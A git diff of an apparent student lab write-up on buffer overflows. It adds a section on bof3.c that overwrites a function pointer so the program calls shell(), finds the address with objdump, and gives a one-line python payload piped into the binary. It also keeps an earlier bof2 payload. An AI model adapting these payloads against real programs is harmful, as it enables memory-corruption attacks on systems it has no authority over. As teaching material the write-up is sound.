@@ -101,7 +101,7 @@ Instead of returning to its original position to continue the normal program flo
 
 ## II. Conducting the attack: 
 
-Every step has to be done like the attack on `bof1.c` file.
+Every initialized step has to be done like the attack on `bof1.c` file.
 
 If you want to print out this statement `printf("\nYou are on the right way!\n");`
 ```bash
@@ -120,6 +120,27 @@ echo $(python -c "print('a'*40 + '\xef\xbe\xad\xde')") | ./bof2.out
 # BOF3.c 
 ## I. Interpret the attack:
 
+![image](https://github.com/user-attachments/assets/3fd5198e-249c-439b-959e-31bf79ce73ba)
 
+` The goal is to overwrite the func() pointer with the address of the shell() so that, when func() is called, it executes shell() instead of sup().`
+
+## II. Conducting the attack: 
+
+Every initialized step has to be done like the attack on `bof1.c` file.
+
+In order not to load into `gdb bof3.out` and `disas shell` function to get a memory region of shell(), we can
+```bash
+objdump -d bof3.out | grep shell
+```
+
+So that the address of shell() will be displayed below:
+
+![image](https://github.com/user-attachments/assets/5347273d-cc2d-49f7-a991-8bf9608349ae)
+
+The attack: 
+```bash
+echo $(python -c "print('a'*128 + '\x5b\x84\x04\x08')") | ./bof3.out
+```
+![image](https://github.com/user-attachments/assets/1521539c-ebe3-4fb7-9973-03c0738778c8)
 
 
